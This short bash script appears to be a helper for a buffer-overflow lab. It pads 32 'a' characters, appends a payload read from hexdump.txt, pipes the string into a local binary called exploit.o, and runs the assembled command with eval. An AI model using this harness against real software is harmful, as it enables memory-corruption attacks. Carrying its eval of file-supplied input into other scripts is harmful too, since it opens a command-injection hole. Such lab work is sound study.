#!/bin/bash
echo "Hello"
PAYLOAD=""
PAYLOAD=$(./payload hexdump.txt)
echo $PAYLOAD

P1="python -c 'print \"a\"*32 + \""
P1+=$PAYLOAD
P1+="\"' | ./exploit.o"
echo $P1
eval $P1 
